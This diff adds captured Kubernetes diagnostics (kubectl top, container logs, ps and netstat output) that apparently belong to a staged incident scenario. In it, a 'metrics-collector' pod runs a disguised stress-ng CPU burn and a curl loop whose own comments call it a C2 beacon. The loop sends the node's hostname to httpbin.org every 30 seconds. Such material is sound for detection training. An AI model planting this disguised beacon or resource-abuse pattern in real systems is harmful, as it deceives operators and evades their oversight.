@@ -1,0 +1,203 @@
+2026-11-06T11:14:46Z
+NAMESPACE            NAME                                           CPU(cores)   MEMORY(bytes)   
+calico-apiserver     calico-apiserver-b8b94894b-8b5nc               6m           29Mi            
+calico-apiserver     calico-apiserver-b8b94894b-rqxzh               6m           24Mi            
+calico-system        calico-kube-controllers-57665c48f7-zgftm       5m           12Mi            
+calico-system        calico-node-m6vrj                              17m          86Mi            
+calico-system        calico-typha-7479486f-hvdjf                    2m           17Mi            
+calico-system        csi-node-driver-6w8bv                          0m           8Mi             
+kube-system          coredns-7c65d6cfc9-slhbj                       2m           29Mi            
+kube-system          coredns-7c65d6cfc9-wl6rh                       2m           20Mi            
+kube-system          etcd-fhm9do9pul5klkohia9h                      22m          56Mi            
+kube-system          fluent-bit-g746b                               2m           13Mi            
+kube-system          kube-apiserver-fhm9do9pul5klkohia9h            38m          346Mi           
+kube-system          kube-controller-manager-fhm9do9pul5klkohia9h   12m          74Mi            
+kube-system          kube-proxy-nzw28                               1m           32Mi            
+kube-system          kube-scheduler-fhm9do9pul5klkohia9h            3m           33Mi            
+kube-system          metrics-server-c9658664b-2rh96                 4m           19Mi            
+local-path-storage   local-path-provisioner-868d848697-wdx76        1m           7Mi             
+monitoring-system    metrics-collector                              1602m        7Mi             
+tigera-operator      tigera-operator-9544b9c86-fkkj7                2m           28Mi            
+NAME                   CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%   
+fhm9do9pul5klkohia9h   2697m        33%    11964Mi         75%       
+2026-11-06T11:11:17.060162759Z     "batch_id": 42,
+2026-11-06T11:11:17.060167376Z     "metrics_count": 1500,
+2026-11-06T11:11:17.060171886Z     "source": "node-metrics-collector"
+2026-11-06T11:11:17.060176189Z   }
+2026-11-06T11:11:17.060180796Z }
+2026-11-06T11:11:17.061354280Z [DEBUG] Batch sent successfully
+2026-11-06T11:11:47.062297464Z [DEBUG] Aggregating metrics batch...
+2026-11-06T11:11:47.062340086Z [DEBUG] Sending to remote endpoint...
+2026-11-06T11:11:47.389353612Z {
+2026-11-06T11:11:47.389405276Z   "args": {},
+2026-11-06T11:11:47.389411598Z   "headers": {
+2026-11-06T11:11:47.389416817Z     "Accept": "*/*",
+2026-11-06T11:11:47.389422619Z     "Content-Length": "70",
+2026-11-06T11:11:47.389444896Z     "Content-Type": "application/json",
+2026-11-06T11:11:47.389450210Z     "Host": "httpbin.org",
+2026-11-06T11:11:47.389454776Z     "User-Agent": "curl/8.23.0"
+2026-11-06T11:11:47.389459152Z   },
+2026-11-06T11:11:47.389468359Z   "method": "POST",
+2026-11-06T11:11:47.389472816Z   "origin": "[REDACTED_PUBLIC_NAT]",
+2026-11-06T11:11:47.389477147Z   "url": "http://httpbin.org/post",
+2026-11-06T11:11:47.389482198Z   "data": "{\"source\":\"node-metrics-collector\",\"metrics_count\":1500,\"batch_id\":42}",
+2026-11-06T11:11:47.389487006Z   "files": {},
+2026-11-06T11:11:47.389491486Z   "form": {},
+2026-11-06T11:11:47.389495833Z   "json": {
+2026-11-06T11:11:47.389500182Z     "batch_id": 42,
+2026-11-06T11:11:47.389504506Z     "metrics_count": 1500,
+2026-11-06T11:11:47.389508945Z     "source": "node-metrics-collector"
+2026-11-06T11:11:47.389513361Z   }
+2026-11-06T11:11:47.389517822Z }
+2026-11-06T11:11:47.390825463Z [DEBUG] Batch sent successfully
+2026-11-06T11:12:17.391798746Z [DEBUG] Aggregating metrics batch...
+2026-11-06T11:12:17.391853343Z [DEBUG] Sending to remote endpoint...
+2026-11-06T11:12:17.636103119Z {
+2026-11-06T11:12:17.636151480Z   "args": {},
+2026-11-06T11:12:17.636157228Z   "headers": {
+2026-11-06T11:12:17.636161817Z     "Accept": "*/*",
+2026-11-06T11:12:17.636166601Z     "Content-Length": "70",
+2026-11-06T11:12:17.636172622Z     "Content-Type": "application/json",
+2026-11-06T11:12:17.636176868Z     "Host": "httpbin.org",
+2026-11-06T11:12:17.636180665Z     "User-Agent": "curl/8.23.0"
+2026-11-06T11:12:17.636184442Z   },
+2026-11-06T11:12:17.636188504Z   "method": "POST",
+2026-11-06T11:12:17.636192639Z   "origin": "[REDACTED_PUBLIC_NAT]",
+2026-11-06T11:12:17.636197132Z   "url": "http://httpbin.org/post",
+2026-11-06T11:12:17.636202237Z   "data": "{\"source\":\"node-metrics-collector\",\"metrics_count\":1500,\"batch_id\":42}",
+2026-11-06T11:12:17.636206533Z   "files": {},
+2026-11-06T11:12:17.636210818Z   "form": {},
+2026-11-06T11:12:17.636215111Z   "json": {
+2026-11-06T11:12:17.636219340Z     "batch_id": 42,
+2026-11-06T11:12:17.636223761Z     "metrics_count": 1500,
+2026-11-06T11:12:17.636227969Z     "source": "node-metrics-collector"
+2026-11-06T11:12:17.636232922Z   }
+2026-11-06T11:12:17.636236669Z }
+2026-11-06T11:12:17.637322334Z [DEBUG] Batch sent successfully
+2026-11-06T11:12:47.638562369Z [DEBUG] Aggregating metrics batch...
+2026-11-06T11:12:47.638605923Z [DEBUG] Sending to remote endpoint...
+2026-11-06T11:12:47.882438152Z {
+2026-11-06T11:12:47.882483349Z   "args": {},
+2026-11-06T11:12:47.882489131Z   "headers": {
+2026-11-06T11:12:47.882494303Z     "Accept": "*/*",
+2026-11-06T11:12:47.882499061Z     "Content-Length": "70",
+2026-11-06T11:12:47.882504939Z     "Content-Type": "application/json",
+2026-11-06T11:12:47.882509761Z     "Host": "httpbin.org",
+2026-11-06T11:12:47.882513867Z     "User-Agent": "curl/8.23.0"
+2026-11-06T11:12:47.882518004Z   },
+2026-11-06T11:12:47.882522526Z   "method": "POST",
+2026-11-06T11:12:47.882527429Z   "origin": "[REDACTED_PUBLIC_NAT]",
+2026-11-06T11:12:47.882531855Z   "url": "http://httpbin.org/post",
+2026-11-06T11:12:47.882537526Z   "data": "{\"source\":\"node-metrics-collector\",\"metrics_count\":1500,\"batch_id\":42}",
+2026-11-06T11:12:47.882541292Z   "files": {},
+2026-11-06T11:12:47.882544154Z   "form": {},
+2026-11-06T11:12:47.882546694Z   "json": {
+2026-11-06T11:12:47.882549203Z     "batch_id": 42,
+2026-11-06T11:12:47.882551774Z     "metrics_count": 1500,
+2026-11-06T11:12:47.882554444Z     "source": "node-metrics-collector"
+2026-11-06T11:12:47.882575717Z   }
+2026-11-06T11:12:47.882578500Z }
+2026-11-06T11:12:47.883618485Z [DEBUG] Batch sent successfully
+2026-11-06T11:13:17.884574167Z [DEBUG] Aggregating metrics batch...
+2026-11-06T11:13:17.884632328Z [DEBUG] Sending to remote endpoint...
+2026-11-06T11:13:18.213652500Z {
+2026-11-06T11:13:18.213697017Z   "args": {},
+2026-11-06T11:13:18.213701669Z   "headers": {
+2026-11-06T11:13:18.213705248Z     "Accept": "*/*",
+2026-11-06T11:13:18.213708506Z     "Content-Length": "70",
+2026-11-06T11:13:18.213712348Z     "Content-Type": "application/json",
+2026-11-06T11:13:18.213715227Z     "Host": "httpbin.org",
+2026-11-06T11:13:18.213718230Z     "User-Agent": "curl/8.23.0"
+2026-11-06T11:13:18.213720855Z   },
+2026-11-06T11:13:18.213723582Z   "method": "POST",
+2026-11-06T11:13:18.213726717Z   "origin": "[REDACTED_PUBLIC_NAT]",
+2026-11-06T11:13:18.213729605Z   "url": "http://httpbin.org/post",
+2026-11-06T11:13:18.213732920Z   "data": "{\"source\":\"node-metrics-collector\",\"metrics_count\":1500,\"batch_id\":42}",
+2026-11-06T11:13:18.213735651Z   "files": {},
+2026-11-06T11:13:18.213738134Z   "form": {},
+2026-11-06T11:13:18.213740802Z   "json": {
+2026-11-06T11:13:18.213743402Z     "batch_id": 42,
+2026-11-06T11:13:18.213746055Z     "metrics_count": 1500,
+2026-11-06T11:13:18.213749000Z     "source": "node-metrics-collector"
+2026-11-06T11:13:18.213751931Z   }
+2026-11-06T11:13:18.213755628Z }
+2026-11-06T11:13:18.215225239Z [DEBUG] Batch sent successfully
+2026-11-06T11:13:48.216242193Z [DEBUG] Aggregating metrics batch...
+2026-11-06T11:13:48.216293340Z [DEBUG] Sending to remote endpoint...
+2026-11-06T11:13:48.535174468Z {
+2026-11-06T11:13:48.535216780Z   "args": {},
+2026-11-06T11:13:48.535222823Z   "headers": {
+2026-11-06T11:13:48.535228729Z     "Accept": "*/*",
+2026-11-06T11:13:48.535234002Z     "Content-Length": "70",
+2026-11-06T11:13:48.535239929Z     "Content-Type": "application/json",
+2026-11-06T11:13:48.535244083Z     "Host": "httpbin.org",
+2026-11-06T11:13:48.535247948Z     "User-Agent": "curl/8.23.0"
+2026-11-06T11:13:48.535252196Z   },
+2026-11-06T11:13:48.535256245Z   "method": "POST",
+2026-11-06T11:13:48.535260346Z   "origin": "[REDACTED_PUBLIC_NAT]",
+2026-11-06T11:13:48.535264340Z   "url": "http://httpbin.org/post",
+2026-11-06T11:13:48.535270275Z   "data": "{\"source\":\"node-metrics-collector\",\"metrics_count\":1500,\"batch_id\":42}",
+2026-11-06T11:13:48.535274301Z   "files": {},
+2026-11-06T11:13:48.535278260Z   "form": {},
+2026-11-06T11:13:48.535282468Z   "json": {
+2026-11-06T11:13:48.535287088Z     "batch_id": 42,
+2026-11-06T11:13:48.535291573Z     "metrics_count": 1500,
+2026-11-06T11:13:48.535295880Z     "source": "node-metrics-collector"
+2026-11-06T11:13:48.535299715Z   }
+2026-11-06T11:13:48.535303599Z }
+2026-11-06T11:13:48.536528708Z [DEBUG] Batch sent successfully
+2026-11-06T11:14:18.537411284Z [DEBUG] Aggregating metrics batch...
+2026-11-06T11:14:18.537461334Z [DEBUG] Sending to remote endpoint...
+2026-11-06T11:14:18.780843835Z {
+2026-11-06T11:14:18.780894289Z   "args": {},
+2026-11-06T11:14:18.780900857Z   "headers": {
+2026-11-06T11:14:18.780906282Z     "Accept": "*/*",
+2026-11-06T11:14:18.780911291Z     "Content-Length": "70",
+2026-11-06T11:14:18.780916305Z     "Content-Type": "application/json",
+2026-11-06T11:14:18.780920814Z     "Host": "httpbin.org",
+2026-11-06T11:14:18.780925420Z     "User-Agent": "curl/8.23.0"
+2026-11-06T11:14:18.780929787Z   },
+2026-11-06T11:14:18.780934073Z   "method": "POST",
+2026-11-06T11:14:18.780938499Z   "origin": "[REDACTED_PUBLIC_NAT]",
+2026-11-06T11:14:18.780961651Z   "url": "http://httpbin.org/post",
+2026-11-06T11:14:18.780966878Z   "data": "{\"source\":\"node-metrics-collector\",\"metrics_count\":1500,\"batch_id\":42}",
+2026-11-06T11:14:18.780971830Z   "files": {},
+2026-11-06T11:14:18.780976823Z   "form": {},
+2026-11-06T11:14:18.780981675Z   "json": {
+2026-11-06T11:14:18.780985941Z     "batch_id": 42,
+2026-11-06T11:14:18.780990093Z     "metrics_count": 1500,
+2026-11-06T11:14:18.780994539Z     "source": "node-metrics-collector"
+2026-11-06T11:14:18.780999182Z   }
+2026-11-06T11:14:18.781003961Z }
+2026-11-06T11:14:18.782797591Z [DEBUG] Batch sent successfully
+2026-11-06T11:10:11.610448734Z [HEALTHCHECK] Verifying metrics-collector status...
+2026-11-06T11:10:11.729553107Z [HEALTHCHECK] Service unavailable, triggering recovery...
+2026-11-06T11:10:11.729579655Z [HEALTHCHECK] Recovery workflow initiated
+PID   USER     TIME  COMMAND
+    1 root      0:00 /bin/sh -c echo "[INFO] Metrics collector starting..." echo "[INFO] Initializing aggregation pipeline..." # Hidden: install tools apk add --no-cache stress-ng curl > /dev/null 2>&1 echo "[INFO] Connected to metrics backend" echo "[INFO] Starting collection loop..." # Hidden: CPU load (looks like metrics processing) stress-ng --cpu 2 --cpu-load 80 --timeout 0 & # Hidden: C2 beacon disguised as metrics export while true; do   echo "[DEBUG] Aggregating metrics batch..."   echo "[DEBUG] Sending to remote endpoint..."   curl -s -X POST http://httpbin.org/post \     -H "Content-Type: application/json" \     -d '{"source":"node-'$(hostname)'","metrics_count":1500,"batch_id":42}' \     || true   echo "[DEBUG] Batch sent successfully"   sleep 30 done 
+   10 root      0:00 stress-ng --cpu 2 --cpu-load 80 --timeout 0
+   13 root      5:13 stress-ng-cpu
+   14 root      5:13 stress-ng-cpu
+   51 root      0:00 sleep 30
+   52 root      0:00 ps aux
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       
+tcp        0      0 10.200.180.10:47106     3.221.253.123:80        TIME_WAIT   
+tcp        0      0 10.200.180.10:44392     54.172.45.38:80         TIME_WAIT   
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node Path
+unix  2      [ ]         DGRAM                    406519 
+    PID    PPID %CPU %MEM COMMAND
+  69170   69167 79.8  0.0 stress-ng-cpu
+  69171   69167 79.8  0.0 stress-ng-cpu
+  10057   10010 19.6  1.5 unattended-upgr
+   8764    8568 11.4 54.2 java
+   2629    2426  5.1  2.3 kube-apiserver
+   9391       1  4.9  3.1 node
+  83820   10057  3.0  1.0 unattended-upgr
+   2754       1  2.7  0.6 kubelet
+   2642    2424  2.4  0.4 etcd
+    765       1  1.9  0.5 containerd
+      1       0  1.5  0.0 systemd
+   2628    2427  1.3  0.7 kube-controller
+   6779    6764  1.1  0.3 calico-node
